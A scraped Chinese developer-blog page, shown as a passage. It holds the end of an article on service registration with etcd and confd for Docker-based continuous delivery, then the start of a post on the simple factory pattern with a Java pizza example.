&#x548C;value&#x65F6;&#x643A;&#x5E26;&#x4E86;ttl&#x8D85;&#x65F6;&#x5C5E;&#x6027;&#xFF0C;&#x5C31;&#x662F;&#x8003;&#x8651;&#x5230;&#x5F53;&#x670D;&#x52A1;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;&#x5B9E;&#x4F8B;&#x5B95;&#x673A;&#x540E;&#xFF0C;&#x5B83;&#x5728;etcd&#x4E2D;&#x6CE8;&#x518C;&#x7684;&#x4FE1;&#x606F;&#x4E5F;&#x968F;&#x4E4B;&#x5931;&#x6548;&#xFF0C;&#x82E5;&#x4E0D;&#x4E88;&#x6E05;&#x9664;&#xFF0C;&#x5931;&#x6548;&#x7684;&#x4FE1;&#x606F;&#x5C06;&#x4F1A;&#x6210;&#x4E3A;&#x5783;&#x573E;&#x6570;&#x636E;&#x88AB;&#x4E00;&#x76F4;&#x4FDD;&#x5B58;&#xFF0C;&#x800C;&#x4E14;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#x8FD8;&#x4F1A;&#x628A;&#x5B83;&#x5F53;&#x505A;&#x6B63;&#x5E38;&#x6570;&#x636E;&#x8BFB;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5199;&#x5165;web server&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x3002;&#x8981;&#x4FDD;&#x8BC1;&#x5B58;&#x50A8;&#x5728;etcd&#x4E2D;&#x7684;&#x6570;&#x636E;&#x59CB;&#x7EC8;&#x6709;&#x6548;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x8BA9;etcd&#x4E3B;&#x52A8;&#x91CA;&#x653E;&#x65E0;&#x6548;&#x7684;&#x5B9E;&#x4F8B;&#x4FE1;&#x606F;&#xFF0C;&#x6765;&#x770B;&#x4E00;&#x4E0B;&#x6CE8;&#x518C;&#x4E2D;&#x5FC3;&#x5237;&#x65B0;&#x7684;&#x673A;&#x5236;&#xFF0C;&#x4EE3;&#x7801;&#x76F4;&#x63A5;&#x5949;&#x4E0A;&#xFF1A;</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#x590D;&#x5236;&#x4EE3;&#x7801;`#!/usr/bin/env pythonimport etcdimport sys`</span><br><span class="line">&gt; arg_l=sys.argv[1:]</span><br><span class="line">&gt; etcd_clt=etcd.Client(host=&apos;172.18.0.7&apos;)def set_key(key,value,ttl=10):</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0;try: &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;return etcd_clt.write(key,value,ttl) &#xA0; &#xA0; &#xA0; &#xA0;except TypeError: &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;print &apos;key or vlaue is null&apos;def refresh_key(key,ttl=10):</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0;try: &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;return etcd_clt.refresh(key,ttl) &#xA0; &#xA0; &#xA0; &#xA0;except TypeError: &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;print &apos;key is null&apos;def del_key(key):</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0;try: &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;return etcd_clt.delete(key) &#xA0; &#xA0; &#xA0; &#xA0;except TypeError: &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;print &apos;key is null&apos;if arg_l: &#xA0; &#xA0; &#xA0; &#xA0;if len(arg_l) == 3:</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;key,value,ttl=arg_l</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;set_key(key,value,ttl) &#xA0; &#xA0; &#xA0; &#xA0;elif len(arg_l) == 2:</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;key,ttl=arg_l</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;refresh_key(key,ttl) &#xA0; &#xA0; &#xA0; &#xA0;elif len(arg_l) == 1:</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;key=arg_l[0]</span><br><span class="line">&gt;  &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;del_key(key) &#xA0; &#xA0; &#xA0; &#xA0;else: &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0; &#xA0;raise TypeError,&apos;Only three parameters are needed here&apos;else: &#xA0; &#xA0; &#xA0; &#xA0;raise Exception(&apos;args is null&apos;)</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="&#x670D;&#x52A1;&#x7684;&#x53D1;&#x73B0;"><a href="#&#x670D;&#x52A1;&#x7684;&#x53D1;&#x73B0;" class="headerlink" title="&#x670D;&#x52A1;&#x7684;&#x53D1;&#x73B0;"></a><strong>&#x670D;&#x52A1;&#x7684;&#x53D1;&#x73B0;</strong></h2><p>confd&#x662F;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x914D;&#x7F6E;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x652F;&#x6301;etcd&#x4F5C;&#x4E3A;&#x540E;&#x7AEF;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x901A;&#x8FC7;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x6E90;&#x6570;&#x636E;&#xFF0C;&#x4FDD;&#x8BC1;&#x672C;&#x5730;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E3A;&#x6700;&#x65B0;&#xFF1B;&#x4E0D;&#x4EC5;&#x5982;&#x6B64; &#xFF0C;&#x5B83;&#x8FD8;&#x53EF;&#x4EE5;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x66F4;&#x65B0;&#x540E;&#xFF0C;&#x68C0;&#x67E5;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BED;&#x6CD5;&#x6709;&#x6548;&#x6027;&#xFF0C;&#x4EE5;&#x91CD;&#x65B0;&#x52A0;&#x8F7D;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4F7F;&#x914D;&#x7F6E;&#x751F;&#x6548;&#x3002;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x8BF4;&#x660E;&#x7684;&#x662F;&#xFF0C;confd&#x867D;&#x7136;&#x652F;&#x6301;rancher&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x6E90;&#xFF0C;&#x4F46;&#x8003;&#x8651;&#x6613;&#x7528;&#x6027;&#x548C;&#x6269;&#x5C55;&#x6027;&#x7B49;&#x539F;&#x56E0;&#xFF0C;&#x6700;&#x7EC8;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x9009;&#x62E9;&#x4E86;etcd&#x3002;</p>
<p>&#x548C;&#x5927;&#x591A;&#x6570;&#x90E8;&#x7F72;&#x65B9;&#x5F0F;&#x4E00;&#x6837;&#xFF0C;&#x6211;&#x4EEC;&#x628A;confd&#x90E8;&#x7F72;&#x5728;web server&#x6240;&#x5728;&#x7684;ECS&#x4E0A;&#xFF0C;&#x4FBF;&#x4E8E;confd&#x5728;&#x76D1;&#x6D4B;&#x5230;&#x6570;&#x636E;&#x53D8;&#x5316;&#x540E;&#x53CA;&#x65F6;&#x66F4;&#x65B0;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x548C;&#x91CD;&#x542F;&#x7A0B;&#x5E8F;&#x3002;confd&#x7684;&#x76F8;&#x5173;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x548C;&#x6A21;&#x677F;&#x6587;&#x4EF6;&#x90E8;&#x7F72;&#x5728;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;/etc/confd&#x4E0B;&#xFF0C;&#x76EE;&#x5F55;&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#xFF1A;</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; &#x590D;&#x5236;&#x4EE3;&#x7801;`/etc/confd/`</span><br><span class="line">&gt; &#x251C;&#x2500;&#x2500; conf.d&#x251C;&#x2500;&#x2500; confd.toml&#x2514;&#x2500;&#x2500; templates</span><br><span class="line">&gt; </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>confd.toml&#x662F;confd&#x7684;&#x4E3B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x4F7F;&#x7528;TOML&#x683C;&#x5F0F;&#x7F16;&#x5199;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;etcd&#x662F;&#x96C6;&#x7FA4;&#x90E8;&#x7F72;&#xFF0C;&#x6709;&#x591A;&#x4E2A;&#x8282;&#x70B9;&#xFF0C;&#x800C;&#x6211;&#x53C8;&#x4E0D;&#x60F3;&#x628A;confd&#x7684;&#x6307;&#x4EE4;&#x641E;&#x7684;&#x53C8;&#x81ED;&#x53C8;&#x957F;&#xFF0C;&#x6240;&#x4EE5;&#x5C06;interval&#x3001;nodes&#x7B49;&#x9009;&#x9879;&#x5199;&#x5230;&#x4E86;&#x8FD9;&#x4E2A;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x91CC;&#x3002;</p>
<p>cond.d&#x76EE;&#x5F55;&#x5B58;&#x653E;web server&#x7684;&#x6A21;&#x677F;&#x914D;&#x7F6E;&#x6E90;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F7F;&#x7528;TOML&#x683C;&#x5F0F;&#x7F16;&#x5199;&#x3002;&#x8BE5;&#x6587;&#x4EF6;&#x7528;&#x4E8E;&#x6307;&#x5B9A;&#x5E94;&#x7528;&#x6A21;&#x677F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF08;src&#xFF09;&#x3001;&#x5E94;&#x7528;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF08;dest&#xFF09;&#x3001;&#x6570;&#x636E;&#x6E90;&#x7684;key&#x4FE1;&#x606F;&#xFF08;keys&#xFF09;&#x7B49;&#x3002;</p>
<p>templates&#x76EE;&#x5F55;&#x5B58;&#x653E;web server&#x4E0B;&#x6BCF;&#x4E2A;&#x5E94;&#x7528;&#x7684;&#x6A21;&#x677F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;&#x5B83;&#x4F7F;&#x7528;Go&#x652F;&#x6301;&#x7684;text/template&#x8BED;&#x8A00;&#x683C;&#x5F0F;&#x8FDB;&#x884C;&#x7F16;&#x5199;&#x3002;&#x5728;confd&#x4ECE;etcd&#x4E2D;&#x8BFB;&#x53D6;&#x5230;&#x6700;&#x65B0;&#x5E94;&#x7528;&#x6CE8;&#x518C;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x8BED;&#x53E5;&#x5199;&#x5165;&#x6A21;&#x677F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;`{{range getvs &quot;/${APP_NAME}/*&quot;}}`</span><br><span class="line"> &#xA0; &#xA0; &#xA0; &#xA0;server {{.}};{{end}}</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/c63e60ad8920a484fa7d4bb98781ee4ff3e0c388d78dde2b977bd202010e48ec" alt> </p>
<p> &#x56FE;13: &#x5E94;&#x7528;&#x53D1;&#x73B0;&#x793A;&#x610F;&#x56FE;<br> &#x901A;&#x8FC7;supervisor&#x7BA1;&#x7406;confd&#x8FDB;&#x7A0B;&#x3002;confd&#x5728;&#x8FD0;&#x884C;&#x540E;&#x4F1A;&#x6BCF;&#x9694;5&#x79D2;&#x5BF9;etcd&#x8FDB;&#x884C;&#x8F6E;&#x8BE2;&#xFF0C;&#x5F53;&#x67D0;&#x4E2A;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x7684;K/V&#x66F4;&#x65B0;&#x540E;&#xFF0C;confd&#x4F1A;&#x8BFB;&#x53D6;&#x8BE5;&#x5E94;&#x7528;&#x5B58;&#x50A8;&#x5728;etcd&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5199;&#x5165;&#x5230;&#x6A21;&#x677F;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x751F;&#x6210;&#x8FD9;&#x4E2A;&#x5E94;&#x7528;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x6700;&#x540E;&#x7531;confd&#x5C06;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x5199;&#x5165;&#x5230;&#x76EE;&#x6807;&#x8DEF;&#x5F84;&#x4E0B;&#xFF0C;&#x91CD;&#x65B0;&#x52A0;&#x8F7D;nginx&#x7A0B;&#x5E8F;&#x4F7F;&#x914D;&#x7F6E;&#x751F;&#x6548;&#x3002;&#xFF08;&#x4EE3;&#x7801;&#x8BF7;&#x53C2;&#x8003;&#xFF1A;<a href="/external_links/707c5263f7c05f511ede902b78de5a45.html" target="blank" rel="noopener">https://zhuanlan.zhihu.com/idevops</a> &#xFF09; </p>
<h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a><strong>&#x603B;&#x7ED3;</strong></h2><p>&#x672C;&#x6587;&#x662F;&#x4E94;&#x963F;&#x54E5;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x56E2;&#x961F;&#x9488;&#x5BF9;Docker&#x5BB9;&#x5668;&#x6280;&#x672F;&#x5728;&#x5982;&#x4F55;&#x5728;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x8FC7;&#x7A0B;&#x4E2D;&#x63A2;&#x7D22;&#x548C;&#x5B9E;&#x8DF5;&#xFF0C;&#x76EE;&#x524D;&#x5DF2;&#x7ECF;&#x5C06;&#x53D1;&#x5E03;&#x90E8;&#x7F72;&#x6743;&#x9650;&#x5F00;&#x653E;&#x7ED9;&#x5E94;&#x7528;&#x5F00;&#x53D1;&#x7684;owner&#xFF0C;&#x5B9E;&#x73B0;7*24&#x5C0F;&#x65F6;&#x201C;&#x4E00;&#x7AD9;&#x5F0F;&#x201D;&#x7684;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#xFF0C;&#x6574;&#x4F53;&#x63D0;&#x9AD8;&#x4E86;&#x516C;&#x53F8;&#x7684;&#x7814;&#x53D1;&#x8FC7;&#x7A0B;&#x7684;&#x4EA4;&#x4ED8;&#x80FD;&#x529B;&#x3002;</p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x4F1A;&#x4E0D;&#x65AD;&#x4F18;&#x5316;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x5230;&#x7684;&#x5404;&#x79CD;&#x573A;&#x666F;&#xFF0C;&#x9010;&#x6E10;&#x5B8C;&#x5584;&#x5BB9;&#x5668;&#x4E91;&#x5E73;&#x53F0;&#xFF0C;&#x540C;&#x65F6;&#x4F1A;&#x5C06;&#x5BB9;&#x5668;&#x4E91;&#x5E73;&#x53F0;&#x5404;&#x79CD;&#x529F;&#x80FD;&#xFF0C;&#x603B;&#x7ED3;&#x7684;&#x7ECF;&#x9A8C;&#x548C;&#x6559;&#x8BAD;&#x4E0D;&#x65AD;&#x5206;&#x4EAB;&#x7ED9;&#x5927;&#x5BB6;&#xFF0C;&#x7ED9;&#x5927;&#x5BB6;&#x5728;&#x5DE5;&#x4F5C;&#x4E2D;&#x4E00;&#x4E9B;&#x53C2;&#x8003;&#xFF0C;&#x907F;&#x514D;&#x8D70;&#x91CD;&#x590D;&#x7684;&#x201C;&#x5F2F;&#x8DEF;&#x201D;&#x3002;</p>
<blockquote>
<p>&#x4F5C;&#x8005;&#x7B80;&#x4ECB;&#xFF1A;&#x5218;&#x6653;&#x660E;&#xFF0C;&#x4E94;&#x963F;&#x54E5;&#x94A2;&#x94C1;&#x7535;&#x5546;&#x5E73;&#x53F0;(wuage.com)&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x8D1F;&#x8D23;&#x4EBA;&#xFF0C;&#x62E5;&#x6709;10&#x5E74;&#x7684;&#x4E92;&#x8054;&#x7F51;&#x5F00;&#x53D1;&#x548C;&#x8FD0;&#x7EF4;&#x7ECF;&#x9A8C;&#x3002;&#x4E00;&#x76F4;&#x81F4;&#x529B;&#x4E8E;&#x8FD0;&#x7EF4;&#x5DE5;&#x5177;&#x7684;&#x5F00;&#x53D1;&#x548C;&#x8FD0;&#x7EF4;&#x4E13;&#x5BB6;&#x670D;&#x52A1;&#x7684;&#x63A8;&#x8FDB;&#xFF0C;&#x8D4B;&#x80FD;&#x5F00;&#x53D1;&#xFF0C;&#x4E0D;&#x65AD;&#x63D0;&#x9AD8;&#x7814;&#x53D1;&#x6548;&#x80FD;&#x3002; </p>
<p>&#x672C;&#x6587;&#x6765;&#x81EA;&#x300A;&#x7A0B;&#x5E8F;&#x5458;&#x300B;&#x539F;&#x521B;&#x6587;&#x7AE0;&#xFF0C;&#x8C22;&#x7EDD;&#x8F6C;&#x8F7D;&#xFF0C;&#x5982;&#x9700;&#x8BA2;&#x9605;&#xFF0C;&#x8BF7;&#x70B9;&#x51FB;&#x8FD9;&#x91CC; &#xFF08;&#x8D23;&#x7F16;&#xFF0F;&#x9B4F;&#x4F1F;&#xFF09;</p>
</blockquote>
<hr>
<p>PS&#xFF1A;&#x63A8;&#x8350;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#x6280;&#x672F;&#x7EBF;&#x4E0A;&#x76F4;&#x64AD;&#xFF0C;&#x8BB2;&#x5E08;&#x6765;&#x81EA;&#x817E;&#x8BAF;&#x3001;&#x534E;&#x4E3A;&#x3001;&#x601D;&#x79D1;&#x3001;58&#x540C;&#x57CE;&#x3001;&#x8611;&#x83C7;&#x8857;&#x3001;&#x5F53;&#x5F53;&#x7B49;6&#x4F4D;&#x4E00;&#x7EBF;&#x4E13;&#x5BB6;&#xFF0C;&#x8BAE;&#x9898;&#x6DB5;&#x76D6;&#x5BB9;&#x5668;&#x4E91;&#x3001;&#x5FAE;&#x670D;&#x52A1;&#x3001;servicemesh&#x7B49;&#x6700;&#x65B0;&#x5B9E;&#x8DF5;&#xFF0C;&#x6B22;&#x8FCE;&#x626B;&#x63CF;&#x4E0B;&#x65B9;&#x4E8C;&#x7EF4;&#x7801;&#x62A5;&#x540D;&#x53C2;&#x52A0;&#x3002; <img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/f5485b35d0a2aee149f4cb7257634ce7e3fd1e5ba6667be995680d1d140fd587" alt></p>
<p><strong>&#x672C;&#x6587;&#x8F6C;&#x8F7D;&#x81EA;:</strong> <a href="/external_links/4e592b4f6a66035c0ab19e8903ff715e.html" target="blank" rel="noopener">&#x6398;&#x91D1;</a></p>
<p><em><a href="https://dev.newban.cn/">&#x5F00;&#x53D1;&#x8005;&#x535A;&#x5BA2; &#x2013; &#x548C;&#x5F00;&#x53D1;&#x76F8;&#x5173;&#x7684; &#x8FD9;&#x91CC;&#x5168;&#x90FD;&#x6709;</a></em></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://dev.newban.cn../../6844903520110379021.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="开发者博客">
      <meta itemprop="description" content>
      <meta itemprop="image" content="../../images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="开发者博客 – IT技术 尽在开发者博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="../../6844903520110379021.html" itemprop="url">设计模式学习笔记-工厂模式   NEZHA的博客 设计模式学</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-08T13:40:49+08:00">
                2017-12-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;-&#x5DE5;&#x5382;&#x6A21;&#x5F0F;"><a href="#&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;-&#x5DE5;&#x5382;&#x6A21;&#x5F0F;" class="headerlink" title="&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;-&#x5DE5;&#x5382;&#x6A21;&#x5F0F;"></a>&#x8BBE;&#x8BA1;&#x6A21;&#x5F0F;&#x5B66;&#x4E60;&#x7B14;&#x8BB0;-&#x5DE5;&#x5382;&#x6A21;&#x5F0F;</h1><p>&#x4ECB;&#x7ECD;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x4E4B;&#x524D;&#x5148;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x62AB;&#x8428;&#x9879;&#x76EE;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x5F15;&#x51FA;&#x95EE;&#x9898;&#xFF0C;&#x7136;&#x540E;&#x7ED9;&#x51FA;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x8FD9;&#x79CD;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x7136;&#x540E;&#x968F;&#x7740;&#x62AB;&#x8428;&#x9879;&#x76EE;&#x7684;&#x4E0D;&#x65AD;&#x6269;&#x5C55;&#xFF0C;&#x9047;&#x5230;&#x65B0;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5F15;&#x51FA;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#x6A21;&#x5F0F;&#xFF0C;&#x7136;&#x540E;&#x53C8;&#x9047;&#x5230;&#x65B0;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x5F15;&#x51FA;&#x6700;&#x7EC8;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x62BD;&#x8C61;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x3002;</p>
<h2 id="&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;"><a href="#&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;" class="headerlink" title="&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;"></a>&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;</h2><p>&#x4ECE;&#x4E0B;&#x9762;&#x7684;UML&#x56FE;&#x4E2D;&#x5C31;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x76F4;&#x89C2;&#x4E0A;&#x770B;&#x51FA;&#xFF1A;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x662F;&#x5B9E;&#x73B0;&#x76F4;&#x63A5;&#x7684;&#x5B9E;&#x4F8B;&#x5BF9;&#x8C61;&#x3002;</p>
<h3 id="&#x7C7B;&#x89C6;&#x56FE;"><a href="#&#x7C7B;&#x89C6;&#x56FE;" class="headerlink" title="&#x7C7B;&#x89C6;&#x56FE;"></a>&#x7C7B;&#x89C6;&#x56FE;</h3><p>&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x662F;&#x7C7B;&#x7684;&#x521B;&#x5EFA;&#x6A21;&#x5F0F;&#xFF0C;&#x53C8;&#x53EB;&#x505A;&#x9759;&#x6001;&#x5DE5;&#x5382;&#x65B9;&#x6CD5;&#xFF08;Static Factory Method&#xFF09;&#x6A21;&#x5F0F;&#x3002;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x662F;&#x7531;&#x4E00;&#x4E2A;&#x5DE5;&#x5382;&#x5BF9;&#x8C61;&#x51B3;&#x5B9A;&#x521B;&#x5EFA;&#x51FA;&#x54EA;&#x4E00;&#x79CD;&#x4EA7;&#x54C1;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x3002;<br>&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7684;&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#xFF1A;</p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/76678240722ce90c5c342247b4b4100f1e55dd2bb4f67802f9db6777d725cddf" alt></p>
<p><img src="https://gitee.com/songjianzaina/juejin_p4/raw/master/img/96f6a279b390c9639376b4136783aabf50cce698cae32d928c34f53917879e94" alt></p>
<h3 id="Java&#x5B9E;&#x4F8B;"><a href="#Java&#x5B9E;&#x4F8B;" class="headerlink" title="Java&#x5B9E;&#x4F8B;"></a>Java&#x5B9E;&#x4F8B;</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x590D;&#x5236;&#x4EE3;&#x7801;public class SimplePizzaFactory {</span><br><span class="line">    public static Pizza createPizza(String type) {</span><br><span class="line">        Pizza pizza = null;</span><br><span class="line">        if (type.equals(&quot;cheese&quot;)) {</span><br><span class="line">            pizza = new CheesePizza();</span><br><span class="line">        } else if (type.equals(&quot;pepperoni&quot;)) {</span><br><span class="line">            pizza = new PepperoniPizza();</span><br><span class="line">        } else if (type.equals(&quot;clam&quot;)) {</span><br><span class="line">            pizza = new ClamPizza();</span><br><span class="line">        } else if (type.equals(&quot;veggie&quot;)) {</span><br><span class="line">            pizza = new VeggiePizza();</span><br><span class="line">        }</span><br><span class="line">        return pizza;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h3 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h3><p>&#x4E0A;&#x9762;&#x7528;&#x62AB;&#x8428;&#x9879;&#x76EE;&#x7684;&#x5217;&#x5B50;&#x6765;&#x8BB2;&#x89E3;&#x4E86;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x603B;&#x7ED3;&#x4E0B;&#x4F18;&#x7F3A;&#x70B9;&#xFF1A;</p>
<p><strong>&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x7684;&#x4F18;&#x70B9;&#xFF1A;</strong></p>
<p>&#x6A21;&#x5F0F;&#x7684;&#x6838;&#x5FC3;&#x662F;&#x5DE5;&#x5382;&#x7C7B;&#x3002;&#x8FD9;&#x4E2A;&#x7C7B;&#x542B;&#x6709;&#x5FC5;&#x8981;&#x7684;&#x5224;&#x65AD;&#x903B;&#x8F91;&#xFF0C;&#x53EF;&#x4EE5;&#x51B3;&#x5B9A;&#x5728;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x521B;&#x5EFA;&#x54EA;&#x4E00;&#x4E2A;&#x4EA7;&#x54C1;&#x7C7B;&#x7684;&#x5B9E;&#x4F8B;&#x3002;&#x800C;&#x5BA2;&#x6237;&#x7AEF;&#x5219;&#x53EF;&#x4EE5;&#x514D;&#x9664;&#x76F4;&#x63A5;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x7684;&#x8D23;&#x4EFB;&#xFF08;&#x6BD4;&#x5982;&#x90A3;&#x4E2A;&#x5E97;&#x957F;&#xFF09;&#x3002;&#x7B80;&#x5355;&#x5DE5;&#x5382;&#x6A21;&#x5F0F;&#x901A;&#x8FC7;&#x8FD9;&#x79CD;&#x505A;&#x6CD5;&#x5B9E;&#x73B0;&#x4E86;&#x5B